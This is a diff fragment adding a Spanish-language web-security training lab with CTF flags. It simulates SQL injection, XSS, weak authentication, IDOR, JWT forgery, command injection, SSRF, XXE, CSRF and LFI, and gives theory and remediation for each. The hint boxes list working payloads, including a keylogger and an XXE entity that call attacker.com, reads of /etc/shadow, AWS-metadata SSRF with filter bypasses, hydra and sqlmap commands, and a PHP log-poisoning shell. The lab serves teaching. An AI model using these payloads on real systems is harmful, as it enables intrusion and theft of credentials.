+            <code>admin'/*</code> · <code>" OR ""="</code> · <code>') OR ('1'='1</code>
+          </div>
+          <div class="flag-box" id="sqli-flag1">🚩 FLAG{SQL_LOGIN_BYPASS} — ¡Autenticación bypaseada sin contraseña!</div>
+        </div>
+      </div>
+
+      <div id="sqli-t1" style="display:none">
+        <div class="card">
+          <div class="card-title">UNION-BASED INJECTION</div>
+          <p style="font-size:0.82rem;color:var(--text2);margin-bottom:1rem;">Query: <code style="color:var(--accent)">SELECT id, name FROM products WHERE id='INPUT'</code></p>
+          <label>ID del producto:</label>
+          <input type="text" id="sqli-union" placeholder="1 UNION SELECT username,password FROM users --">
+          <button class="btn" onclick="sqliUnion()">BUSCAR</button>
+          <div class="output" id="sqli-union-out">Esperando...</div>
+          <div class="hint">
+            <strong>PASOS UNION:</strong><br>
+            1. Determinar columnas: <code>1 ORDER BY 1 --</code>, <code>1 ORDER BY 2 --</code>...<br>
+            2. Encontrar columnas visibles: <code>0 UNION SELECT NULL,NULL --</code><br>
+            3. Extraer datos: <code>0 UNION SELECT username,password FROM users --</code><br>
+            4. Enumerar tablas: <code>0 UNION SELECT table_name,2 FROM information_schema.tables --</code>
+          </div>
+          <div class="flag-box" id="sqli-flag2">🚩 FLAG{SQL_UNION_DATA_EXFIL} — ¡Todos los usuarios y hashes extraídos!</div>
+        </div>
+      </div>
+
+      <div id="sqli-t2" style="display:none">
+        <div class="card">
+          <div class="card-title">BLIND SQL INJECTION (BOOLEAN-BASED)</div>
+          <p style="font-size:0.82rem;color:var(--text2);margin-bottom:1rem;">No hay output visible. Solo sabes si es True o False por la respuesta.</p>
+          <label>ID de usuario:</label>
+          <input type="text" id="sqli-blind" placeholder="1 AND 1=1 --">
+          <button class="btn" onclick="sqliBlind()">ENVIAR</button>
+          <div class="output" id="sqli-blind-out">Esperando...</div>
+          <div class="hint">
+            <strong>TÉCNICA BOOLEAN:</strong><br>
+            <code>1 AND 1=1 --</code> → TRUE (usuario existe)<br>
+            <code>1 AND 1=2 --</code> → FALSE (respuesta diferente)<br>
+            <code>1 AND SUBSTRING(username,1,1)='a' --</code> → extrae char a char<br>
+            <br><strong>Con sqlmap:</strong> <code>sqlmap -u "http://target/page?id=1" --dbs</code>
+          </div>
+          <div class="flag-box" id="sqli-flag3">🚩 FLAG{SQL_BLIND_BOOLEAN} — ¡Blind SQLi confirmado!</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ XSS ══ -->
+    <div class="page" id="page-xss">
+      <div class="vuln-banner"><span class="vtag">A03:2021</span>
+        Cross-Site Scripting — El servidor refleja o almacena input del usuario sin escapar el HTML, permitiendo ejecutar JS arbitrario.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>¿Qué es?</strong> XSS permite inyectar scripts maliciosos en páginas web vistas por otros usuarios.
+          Puede usarse para robar cookies/sesiones, keylogging, redirigir a phishing, o modificar la página.<br><br>
+          <strong>Tipos:</strong> Reflejado (en URL), Almacenado (en BD), DOM-based (en JS del cliente)<br>
+          <strong>Remediación:</strong> Escapar output HTML, CSP headers, HttpOnly cookies, DOMPurify
+        </div>
+      </div>
+      <div class="tab-bar">
+        <div class="tab active" onclick="xssTab(0)">Reflejado</div>
+        <div class="tab" onclick="xssTab(1)">Almacenado</div>
+        <div class="tab" onclick="xssTab(2)">DOM-Based</div>
+      </div>
+      <div id="xss-t0">
+        <div class="card">
+          <div class="card-title">XSS REFLEJADO — Buscador vulnerable</div>
+          <label>Término de búsqueda:</label>
+          <input type="text" id="xss-r" placeholder='<script>alert("XSS")</script>'>
+          <button class="btn" onclick="xssReflected()">BUSCAR</button>
+          <div style="margin-top:1rem;padding:1rem;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);min-height:50px;">
+            <span style="color:var(--text2);font-size:0.82rem;">Resultados para: </span><span id="xss-r-out" style="color:var(--text)"></span>
+          </div>
+          <div class="hint">
+            <strong>PAYLOADS XSS:</strong><br>
+            <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>
+            <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>
+            <code>&lt;svg onload=alert(1)&gt;</code><br>
+            <code>&lt;body onload=alert(1)&gt;</code>
+          </div>
+          <div class="flag-box" id="xss-flag1">🚩 FLAG{XSS_REFLECTED} — Script ejecutado en el contexto del usuario víctima</div>
+        </div>
+      </div>
+      <div id="xss-t1" style="display:none">
+        <div class="card">
+          <div class="card-title">XSS ALMACENADO — Panel de comentarios</div>
+          <label>Nombre:</label>
+          <input type="text" id="xss-s-name" placeholder='Tu nombre o <script>alert(1)</script>'>
+          <label>Comentario:</label>
+          <textarea id="xss-s-comment" rows="3" placeholder="Escribe tu comentario..."></textarea>
+          <button class="btn" onclick="xssStored()">PUBLICAR COMENTARIO</button>
+          <div style="margin-top:1rem;padding:1rem;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);" id="xss-s-board"></div>
+          <div class="hint">
+            <strong>DIFERENCIA:</strong> El XSS almacenado se guarda en BD y afecta a TODOS los usuarios que visiten la página.<br>
+            Prueba: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
+            Keylogger: <code>&lt;script&gt;document.onkeypress=e=&gt;fetch('https://attacker.com?k='+e.key)&lt;/script&gt;</code>
+          </div>
+          <div class="flag-box" id="xss-flag2">🚩 FLAG{XSS_STORED} — Payload almacenado, todos los visitantes son víctimas</div>
+        </div>
+      </div>
+      <div id="xss-t2" style="display:none">
+        <div class="card">
+          <div class="card-title">DOM-BASED XSS</div>
+          <label>Valor del parámetro (simula ?name=...):</label>
+          <input type="text" id="xss-d" placeholder='<img src=x onerror=alert(1)>'>
+          <button class="btn" onclick="xssDOM()">INYECTAR EN DOM</button>
+          <div style="margin-top:1rem;padding:1rem;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);">
+            Bienvenido, <span id="xss-d-out"></span>
+          </div>
+          <div class="hint">
+            <strong>DIFERENCIA:</strong> El servidor no está involucrado. El JS del cliente usa directamente <code>innerHTML</code> o <code>document.write()</code> con datos del usuario.<br>
+            <code>location.hash</code> · <code>document.referrer</code> · <code>window.name</code>
+          </div>
+          <div class="flag-box" id="xss-flag3">🚩 FLAG{XSS_DOM_BASED} — DOM manipulado sin pasar por el servidor</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ AUTH ══ -->
+    <div class="page" id="page-auth">
+      <div class="vuln-banner"><span class="vtag">A07:2021</span>
+        Autenticación Rota — Sin rate limiting, contraseñas débiles, sesiones predecibles y parámetros de confianza del cliente.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>¿Qué es?</strong> Fallas en la implementación de autenticación permiten comprometer contraseñas, claves o tokens de sesión para asumir identidades de otros usuarios.<br><br>
+          <strong>Vectores:</strong> Fuerza bruta, credenciales por defecto, tokens predecibles, enumeration de usuarios<br>
+          <strong>Remediación:</strong> MFA, rate limiting, lockout, bcrypt, tokens aleatorios seguros
+        </div>
+      </div>
+      <div class="tab-bar">
+        <div class="tab active" onclick="authTab(0)">Credenciales Débiles</div>
+        <div class="tab" onclick="authTab(1)">Fuerza Bruta</div>
+        <div class="tab" onclick="authTab(2)">Session Hijacking</div>
+      </div>
+      <div id="auth-t0">
+        <div class="card">
+          <div class="card-title">LOGIN CON CREDENCIALES POR DEFECTO</div>
+          <label>Usuario:</label>
+          <input type="text" id="auth-u" value="admin">
+          <label>Contraseña:</label>
+          <input type="password" id="auth-p" placeholder="Adivina la contraseña...">
+          <button class="btn" onclick="authLogin()">LOGIN</button>
+          <div class="output" id="auth-out">Esperando...</div>
+          <div class="hint">
+            <strong>CONTRASEÑAS COMUNES A PROBAR:</strong><br>
+            <code>admin</code> · <code>1234</code> · <code>password</code> · <code>admin123</code> · <code>root</code><br>
+            <code>123456</code> · <code>qwerty</code> · <code>letmein</code> · <code>welcome</code><br>
+            <br>Con Burp Suite Intruder o hydra:<br>
+            <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form</code>
+          </div>
+          <div class="flag-box" id="auth-flag1">🚩 FLAG{WEAK_CREDENTIALS} — Panel de admin desbloqueado</div>
+        </div>
+      </div>
+      <div id="auth-t1" style="display:none">
+        <div class="card">
+          <div class="card-title">SIMULADOR DE FUERZA BRUTA (sin rate limiting)</div>
+          <label>Usuario objetivo:</label>
+          <input type="text" id="bf-user" value="admin">
+          <label>Wordlist (una por línea):</label>
+          <textarea id="bf-list" rows="6">admin
+password
+1234
+admin123
+qwerty
+root
+letmein
+welcome
+123456
+hackme</textarea>
+          <button class="btn" onclick="bruteForce()">INICIAR FUERZA BRUTA</button>
+          <div class="output" id="bf-out">Esperando...</div>
+          <div class="flag-box" id="auth-flag2">🚩 FLAG{BRUTE_FORCE_SUCCESS} — Contraseña encontrada por fuerza bruta</div>
+        </div>
+      </div>
+      <div id="auth-t2" style="display:none">
+        <div class="card">
+          <div class="card-title">SESSION TOKEN PREDECIBLE</div>
+          <p style="font-size:0.82rem;color:var(--text2);margin-bottom:1rem;">El servidor genera tokens de sesión predecibles (timestamp + userID)</p>
+          <button class="btn" onclick="genSession()">GENERAR SESIÓN COMO GUEST</button>
+          <div class="token-box" id="sess-token" style="margin-top:1rem">—</div>
+          <label style="margin-top:1rem">Token a verificar:</label>
+          <input type="text" id="sess-guess" placeholder="Pega el token o modifícalo...">
+          <button class="btn ghost" onclick="verifySession()">VERIFICAR TOKEN</button>
+          <div class="output" id="sess-out">Esperando...</div>
+          <div class="hint">
+            <strong>PISTA:</strong> El token es base64 de <code>userID:timestamp</code>. Decodifica, cambia el userID a 1 (admin), y re-encoda.<br>
+            <code>echo -n "1:TIMESTAMP" | base64</code>
+          </div>
+          <div class="flag-box" id="auth-flag3">🚩 FLAG{SESSION_HIJACK} — Sesión de admin obtenida</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ IDOR ══ -->
+    <div class="page" id="page-idor">
+      <div class="vuln-banner"><span class="vtag">A01:2021</span>
+        IDOR — El servidor no verifica si el recurso solicitado pertenece al usuario autenticado.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>IDOR (Insecure Direct Object Reference)</strong> ocurre cuando una app usa identificadores controlables por el usuario (ID, filename) para acceder a objetos sin verificar autorización.<br><br>
+          <strong>Impacto:</strong> Acceso a datos de otros usuarios, escalada de privilegios horizontal<br>
+          <strong>Remediación:</strong> Verificar que el recurso pertenece al usuario en cada request, usar IDs indirectos (UUIDs)
+        </div>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <div class="card-title">PERFIL DE USUARIO (IDOR)</div>
+          <p style="font-size:0.8rem;color:var(--text2);margin-bottom:1rem;">Eres el usuario ID=5. Endpoint: <code style="color:var(--accent)">/api/users/{id}</code></p>
+          <label>ID a consultar:</label>
+          <input type="text" id="idor-id" value="5">
+          <button class="btn" onclick="idorUser()">GET /api/users/{id}</button>
+          <div class="output" id="idor-out">Esperando...</div>
+          <div class="hint"><strong>Prueba:</strong> IDs del 1 al 4. El ID=1 es admin 👁</div>
+          <div class="flag-box" id="idor-flag1">🚩 FLAG{IDOR_USER_DATA} — Datos sensibles de otro usuario expuestos</div>
+        </div>
+        <div class="card">
+          <div class="card-title">FACTURAS (IDOR + PATH TRAVERSAL)</div>
+          <label>Archivo:</label>
+          <input type="text" id="idor-file" value="invoice_5.pdf">
+          <button class="btn" onclick="idorFile()">DESCARGAR</button>
+          <div class="output" id="idor-file-out">Esperando...</div>
+          <div class="hint">
+            <strong>Prueba:</strong><br>
+            <code>invoice_1.pdf</code> (otro usuario)<br>
+            <code>../config.php</code><br>
+            <code>../../etc/passwd</code>
+          </div>
+          <div class="flag-box" id="idor-flag2">🚩 FLAG{IDOR_PATH_TRAVERSAL} — Archivo fuera del directorio permitido</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ JWT ══ -->
+    <div class="page" id="page-jwt">
+      <div class="vuln-banner"><span class="vtag">A02:2021</span>
+        JWT Attacks — Secret débil, aceptación de alg:none, falta de validación de firma.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>JWT (JSON Web Token)</strong> es usado para autenticación stateless. Vulnerabilidades comunes:<br><br>
+          · <strong>alg:none</strong> — Servidor acepta tokens sin firma<br>
+          · <strong>Weak secret</strong> — HS256 con secret predecible, crackeable con hashcat<br>
+          · <strong>RS→HS confusion</strong> — Cambiar RSA a HMAC usando la clave pública como secret<br>
+          · <strong>kid injection</strong> — Inyectar SQL/path en el parámetro kid del header<br>
+          <strong>Remediación:</strong> Secrets largos y aleatorios, usar RS256, whitelist de algoritmos, validar todas las claims
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">TOKEN ACTUAL DE SESIÓN</div>
+        <div class="token-box" id="jwt-current">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGVybWlzc2lvbnMiOiJ1c2VyIiwiaWF0IjoxNzAwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</div>
+        <div style="display:flex;gap:8px;margin-top:1rem;flex-wrap:wrap;">
+          <button class="btn sm" onclick="jwtDecode()">DECODIFICAR</button>
+          <button class="btn sm ghost" onclick="jwtCrack()">SIMULAR CRACK (secret123)</button>
+        </div>
+        <div class="output" id="jwt-decode-out">Haz clic en decodificar...</div>
+      </div>
+      <div class="card">
+        <div class="card-title">FORJAR TOKEN MALICIOSO</div>
+        <label>Header (JSON):</label>
+        <input type="text" id="jwt-header" value='{"alg":"HS256","typ":"JWT"}'>
+        <label>Payload (JSON):</label>
+        <textarea id="jwt-payload" rows="4">{"username": "guest", "permissions": "user", "iat": 1700000000}</textarea>
+        <label>Algoritmo:</label>
+        <select id="jwt-alg">
+          <option value="HS256">HS256 — HMAC firmado</option>
+          <option value="none">none — Sin firma (bypass)</option>
+          <option value="RS256">RS256 → HS256 confusion</option>
+        </select>
+        <button class="btn" onclick="jwtForge()">FORJAR TOKEN</button>
+        <div class="token-box" id="jwt-forged" style="margin-top:1rem;min-height:40px;"></div>
+        <button class="btn green" style="margin-top:0.8rem" onclick="jwtUse()">USAR TOKEN FORJADO →</button>
+        <div class="output" id="jwt-use-out"></div>
+        <div class="flag-box" id="jwt-flag">🚩 FLAG{JWT_NONE_ALG_BYPASS} — Acceso de administrador sin firma válida</div>
+      </div>
+    </div>
+
+    <!-- ══ CMD INJECTION ══ -->
+    <div class="page" id="page-cmdi">
+      <div class="vuln-banner"><span class="vtag">A03:2021</span>
+        Command Injection — Input del usuario concatenado directamente en llamadas al sistema operativo.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>OS Command Injection</strong> permite ejecutar comandos arbitrarios en el servidor cuando el input del usuario es pasado sin sanitización a funciones como <code>exec()</code>, <code>system()</code>, <code>shell_exec()</code>.<br><br>
+          <strong>Operadores de inyección:</strong><br>
+          <code>;</code> encadenar · <code>&&</code> AND · <code>||</code> OR · <code>|</code> pipe · <code>`cmd`</code> subshell · <code>$(cmd)</code> subshell alternativo<br><br>
+          <strong>Remediación:</strong> Nunca pasar input a shell. Usar APIs del lenguaje. Validar estrictamente con whitelist.
+        </div>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <div class="card-title">HERRAMIENTA PING VULNERABLE</div>
+          <p style="font-size:0.8rem;color:var(--text2);margin-bottom:1rem;"><code>ping -c 1 [INPUT]</code></p>
+          <label>Host:</label>
+          <input type="text" id="cmd1" placeholder="8.8.8.8; whoami">
+          <button class="btn" onclick="cmdPing()">EJECUTAR</button>
+          <div class="output" id="cmd1-out">Esperando...</div>
+          <div class="hint">
+            <strong>PAYLOADS:</strong><br>
+            <code>8.8.8.8; whoami</code><br>
+            <code>127.0.0.1 && cat /etc/passwd</code><br>
+            <code>x || id</code><br>
+            <code>$(cat /etc/shadow)</code>
+          </div>
+          <div class="flag-box" id="cmd-flag1">🚩 FLAG{CMD_INJECTION_RCE} — Remote Code Execution logrado</div>
+        </div>
+        <div class="card">
+          <div class="card-title">LOOKUP DNS VULNERABLE</div>
+          <p style="font-size:0.8rem;color:var(--text2);margin-bottom:1rem;"><code>nslookup [INPUT]</code></p>
+          <label>Dominio:</label>
+          <input type="text" id="cmd2" placeholder="google.com | ls -la">
+          <button class="btn" onclick="cmdDNS()">RESOLVER</button>
+          <div class="output" id="cmd2-out">Esperando...</div>
+          <div class="hint">
+            <strong>BYPASS DE FILTROS:</strong><br>
+            <code>wh''oami</code> · <code>w\hoami</code> · <code>who$()ami</code><br>
+            Si filtran <code>;</code> prueba <code>%0a</code> (newline) o <code>|</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ SSRF ══ -->
+    <div class="page" id="page-ssrf">
+      <div class="vuln-banner"><span class="vtag">A10:2021</span>
+        SSRF — El servidor hace requests a URLs controladas por el atacante, exponiendo servicios internos.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>SSRF (Server-Side Request Forgery)</strong> permite al atacante inducir al servidor a hacer requests HTTP hacia destinos arbitrarios — incluyendo servicios internos no expuestos al público (metadata cloud, bases de datos, servicios internos).<br><br>
+          <strong>Casos reales:</strong> Capital One breach (2019) via AWS metadata · GitLab SSRF · JIRA SSRF<br>
+          <strong>Targets comunes:</strong> <code>http://169.254.169.254</code> (AWS metadata) · <code>http://localhost:6379</code> (Redis) · <code>http://internal-admin</code><br>
+          <strong>Remediación:</strong> Whitelist de URLs permitidas, bloquear redes internas, no pasar URLs del cliente directamente
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">CARGADOR DE IMÁGENES VULNERABLE</div>
+        <p style="font-size:0.82rem;color:var(--text2);margin-bottom:1rem;">El servidor hace fetch de la URL que le pasas para cargar una imagen remota.</p>
+        <label>URL de la imagen:</label>
+        <input type="text" id="ssrf-url" placeholder="http://169.254.169.254/latest/meta-data/">
+        <button class="btn" onclick="ssrfFetch()">CARGAR IMAGEN</button>
+        <div class="output" id="ssrf-out">Esperando...</div>
+        <div class="hint">
+          <strong>URLs A PROBAR:</strong><br>
+          <code>http://169.254.169.254/latest/meta-data/</code> — AWS metadata<br>
+          <code>http://localhost:8080/admin</code> — Panel admin interno<br>
+          <code>http://192.168.1.1/</code> — Router interno<br>
+          <code>http://internal-db:5432</code> — PostgreSQL<br>
+          <code>file:///etc/passwd</code> — Lectura de archivos<br>
+          <br><strong>BYPASS DE FILTROS:</strong><br>
+          <code>http://2130706433/</code> (127.0.0.1 en decimal)<br>
+          <code>http://0x7f000001/</code> (hex)<br>
+          <code>http://[::1]/</code> (IPv6)
+        </div>
+        <div class="flag-box" id="ssrf-flag">🚩 FLAG{SSRF_METADATA_LEAK} — AWS credentials obtenidos via metadata endpoint</div>
+      </div>
+    </div>
+
+    <!-- ══ XXE ══ -->
+    <div class="page" id="page-xxe">
+      <div class="vuln-banner"><span class="vtag">A05:2021</span>
+        XXE — El parser XML procesa entidades externas definidas por el atacante.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>XXE (XML External Entity)</strong> ocurre cuando un parser XML procesa DOCTYPE con entidades externas. Permite leer archivos del servidor, SSRF, y en algunos casos RCE.<br><br>
+          <strong>Remediación:</strong> Deshabilitar procesamiento de entidades externas en el parser XML. En Java: <code>FEATURE_SECURE_PROCESSING</code>. En PHP: <code>libxml_disable_entity_loader(true)</code>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">IMPORTADOR XML VULNERABLE</div>
+        <label>Payload XML:</label>
+        <textarea id="xxe-input" rows="10">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;order&gt;
+  &lt;product&gt;Laptop&lt;/product&gt;
+  &lt;quantity&gt;1&lt;/quantity&gt;
+&lt;/order&gt;</textarea>
+        <button class="btn" onclick="xxeParse()">ENVIAR XML</button>
+        <div class="output" id="xxe-out">Esperando...</div>
+        <div class="hint">
+          <strong>PAYLOAD XXE — Leer archivo:</strong><br>
+          <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code><br>
+          <code>&lt;order&gt;&lt;product&gt;&amp;xxe;&lt;/product&gt;&lt;/order&gt;</code><br><br>
+          <strong>XXE → SSRF:</strong><br>
+          <code>&lt;!ENTITY xxe SYSTEM "http://internal-service/"&gt;</code><br><br>
+          <strong>Blind XXE (out-of-band):</strong><br>
+          <code>&lt;!ENTITY xxe SYSTEM "http://attacker.com/?data=..."&gt;</code>
+        </div>
+        <div class="flag-box" id="xxe-flag">🚩 FLAG{XXE_FILE_READ} — /etc/passwd leído via XML External Entity</div>
+      </div>
+    </div>
+
+    <!-- ══ CSRF ══ -->
+    <div class="page" id="page-csrf">
+      <div class="vuln-banner"><span class="vtag">A01:2021</span>
+        CSRF — Requests forjados que ejecutan acciones no deseadas en nombre de usuarios autenticados.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>CSRF (Cross-Site Request Forgery)</strong> engaña al navegador de la víctima para que envíe requests autenticados a una aplicación sin que el usuario lo sepa.<br><br>
+          <strong>Ejemplo:</strong> La víctima visita una web maliciosa que tiene un <code>&lt;form&gt;</code> oculto que hace POST a su banco.<br><br>
+          <strong>Remediación:</strong> CSRF tokens únicos por sesión, SameSite=Strict cookies, verificar Origin/Referer header, Double Submit Cookie
+        </div>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <div class="card-title">PERFIL SIN PROTECCIÓN CSRF</div>
+          <p style="font-size:0.8rem;color:var(--text2);margin-bottom:1rem;">Sesión activa como: <strong style="color:var(--accent)">alice@bank.com</strong></p>
+          <label>Nuevo email:</label>
+          <input type="email" id="csrf-email" value="alice@bank.com">
+          <label>CSRF Token:</label>
+          <input type="text" id="csrf-token" placeholder="(vacío = sin protección)" style="color:var(--text3)">
+          <button class="btn" onclick="csrfChange()">ACTUALIZAR PERFIL</button>
+          <div class="output" id="csrf-out">Esperando...</div>
+          <div class="hint">
+            <strong>ATAQUE:</strong> Deja el token vacío y cambia el email. Sin token, cualquier página puede hacer este request en nombre de la víctima.<br>
+            Un atacante enviaría:<br>
+            <code>&lt;form action="https://bank.com/profile" method="POST"&gt;<br>&lt;input name="email" value="attacker@evil.com"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code>
+          </div>
+          <div class="flag-box" id="csrf-flag">🚩 FLAG{CSRF_EMAIL_TAKEOVER} — Email cambiado sin CSRF token, cuenta comprometible</div>
+        </div>
+        <div class="card">
+          <div class="card-title">CON PROTECCIÓN CSRF (referencia)</div>
+          <p style="font-size:0.8rem;color:var(--text2);margin-bottom:1rem;">Así debería verse una implementación correcta</p>
+          <div class="theory" style="font-size:0.8rem;">
+            <strong>Token seguro generado por servidor:</strong><br>
+            <code id="real-csrf-token" style="color:var(--green)">Generando...</code>
+          </div>
+          <label style="margin-top:1rem">Token a enviar:</label>
+          <input type="text" id="csrf-good-token" placeholder="Pega el token de arriba">
+          <button class="btn green" onclick="csrfGood()">ACTUALIZAR (PROTEGIDO)</button>
+          <div class="output" id="csrf-good-out">Esperando...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ LFI ══ -->
+    <div class="page" id="page-lfi">
+      <div class="vuln-banner"><span class="vtag">A01:2021</span>
+        LFI / Path Traversal — Inclusión de archivos locales del servidor mediante manipulación de rutas.
+      </div>
+      <div class="card">
+        <div class="card-title">TEORÍA</div>
+        <div class="theory">
+          <strong>LFI (Local File Inclusion)</strong> permite incluir archivos del servidor en la respuesta web. Path Traversal usa secuencias <code>../</code> para navegar fuera del directorio permitido.<br><br>
+          <strong>Archivos objetivo comunes:</strong><br>
+          <code>/etc/passwd</code> · <code>/etc/shadow</code> · <code>C:\Windows\win.ini</code><br>
+          <code>/proc/self/environ</code> · <code>../config.php</code> · <code>web.config</code><br><br>
+          <strong>LFI → RCE:</strong> Via log poisoning, /proc/self/fd, session files<br>
+          <strong>Remediación:</strong> Realpath + whitelist de archivos, no pasar nombres de archivo del usuario
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">LECTOR DE PÁGINAS VULNERABLE</div>
+        <p style="font-size:0.82rem;color:var(--text2);margin-bottom:1rem;">URL: <code style="color:var(--accent)">/page?file=about.html</code></p>
+        <label>Archivo a incluir:</label>
+        <input type="text" id="lfi-file" value="about.html">
+        <button class="btn" onclick="lfiRead()">INCLUIR ARCHIVO</button>
+        <div class="output" id="lfi-out">Esperando...</div>
+        <div class="hint">
+          <strong>PAYLOADS PATH TRAVERSAL:</strong><br>
+          <code>../../../etc/passwd</code><br>
+          <code>....//....//etc/passwd</code> (bypass de filtros simples)<br>
+          <code>%2e%2e%2f%2e%2e%2fetc/passwd</code> (URL encoded)<br>
+          <code>..%252f..%252fetc/passwd</code> (double encoded)<br>
+          <code>/proc/self/environ</code> · <code>../config.php</code>
+        </div>
+        <div class="flag-box" id="lfi-flag">🚩 FLAG{LFI_PATH_TRAVERSAL} — Archivo del sistema leído fuera del webroot</div>
+      </div>
+      <div class="card">
+        <div class="card-title">LOG POISONING → RCE (AVANZADO)</div>
+        <div class="theory" style="font-size:0.82rem;">
+          Si puedes incluir los logs del servidor web vía LFI, y puedes escribir en esos logs (ej. user-agent malicioso), 
+          puedes lograr <strong>Remote Code Execution</strong>:<br><br>
+          1. <code>curl -H "User-Agent: &lt;?php system($_GET['cmd']); ?&gt;" http://target/</code><br>
+          2. <code>/page?file=../../../var/log/apache2/access.log&cmd=whoami</code>
+        </div>
+        <label>Simular User-Agent malicioso en log:</label>
+        <input type="text" id="log-ua" placeholder='<?php system("id"); ?>'>
+        <button class="btn red" onclick="logPoison()">ESCRIBIR EN LOG</button>
+        <label style="margin-top:0.5rem">Incluir log vía LFI + ejecutar cmd:</label>
+        <input type="text" id="log-cmd" placeholder="id, whoami, cat /etc/passwd">
+        <button class="btn" onclick="logRCE()">INCLUIR LOG + EJECUTAR</button>
+        <div class="output" id="log-out">Esperando...</div>
+        <div class="flag-box" id="lfi-flag2">🚩 FLAG{LFI_TO_RCE} — Log Poisoning exitoso — RCE logrado</div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// ══════ STATE ══════
+const USERS = [
+  {id:1,username:'admin',password:'admin',email:'admin@hacklab.com',role:'administrator',ssn:'123-45-6789',cc:'4532-1234-5678-9012',salary:'$250,000'},
+  {id:2,username:'john',password:'password123',email:'john@corp.com',role:'user',ssn:'987-65-4321',cc:'4111-1111-1111-1111',salary:'$75,000'},
+  {id:3,username:'alice',password:'alice2024',email:'alice@corp.com',role:'moderator',ssn:'456-78-9012',cc:'5500-0000-0000-0004',salary:'$95,000'},
+  {id:4,username:'bob',password:'qwerty',email:'bob@corp.com',role:'user',ssn:'321-54-9876',cc:'3714-496353-98431',salary:'$68,000'},
+  {id:5,username:'guest',password:'guest',email:'guest@hacklab.com',role:'user',ssn:'000-00-0000',cc:'N/A',salary:'N/A'},
+];
+
+const FILES = {
+  'about.html':'<h2>Acerca de Nosotros</h2><p>Somos una empresa ficticia...</p>',
+  'contact.html':'<h2>Contacto</h2><p>contact@company.com</p>',
+  '../config.php':'<?php\ndefine("DB_HOST","localhost");\ndefine("DB_USER","root");\ndefine("DB_PASS","sup3rs3cr3t_2024!");\ndefine("DB_NAME","corp_prod");\ndefine("SECRET_KEY","jwt_hs256_k3y_abc123");\n?>',
+  '../../../etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\n🚩 FLAG{LFI_PATH_TRAVERSAL}',
+  '../../etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/nologin\n🚩 FLAG{LFI_PATH_TRAVERSAL}',
+  '/proc/self/environ':'SERVER_SOFTWARE=Apache/2.4.51\nDOCUMENT_ROOT=/var/www/html\nPHP_VERSION=8.1\nDB_PASS=sup3rs3cr3t_2024!\nSECRET=jwt_key_abc123',
+  '../../../var/log/apache2/access.log':'192.168.1.1 - - [01/Nov/2024] "GET / HTTP/1.1" 200 -\n[LOG POISON OUTPUT AQUÍ]',
+  '....//....//etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/nologin\n🚩 FLAG{LFI_BYPASS}',
+};
+
+const CMD_DB = {
+  'whoami':'www-data','id':'uid=33(www-data) gid=33(www-data)',
+  'cat /etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/nologin\nadmin:x:1000:1000::/home/admin:/bin/bash',
+  'cat /etc/shadow':'🚩 FLAG{CMD_INJECTION_RCE}\nroot:$6$salt$hash:19000:0:99999:7:::\nwww-data:!:19000::::::',
+  'ls':'index.php\nconfig.php\n.env\nupload.php\nadmin/',
+  'ls -la':'total 48\ndrwxr-xr-x 3 www-data www-data 4096 Nov  1 .\n-rw-r--r-- 1 www-data www-data  512 Nov  1 index.php\n-rw------- 1 root     root      128 Nov  1 .env\n-rwxr-xr-x 1 www-data www-data 2048 Nov  1 config.php',
+  'cat .env':'DB_HOST=localhost\nDB_USER=root\nDB_PASS=sup3rs3cr3t_2024!\nJWT_SECRET=k3y_abc123\nADMIN_PASS=Adm1n_P@ss2024!',
+  'env':'HOME=/var/www\nPATH=/usr/local/bin:/bin\nDB_PASS=sup3rs3cr3t_2024!\nJWT_SECRET=k3y_abc123',
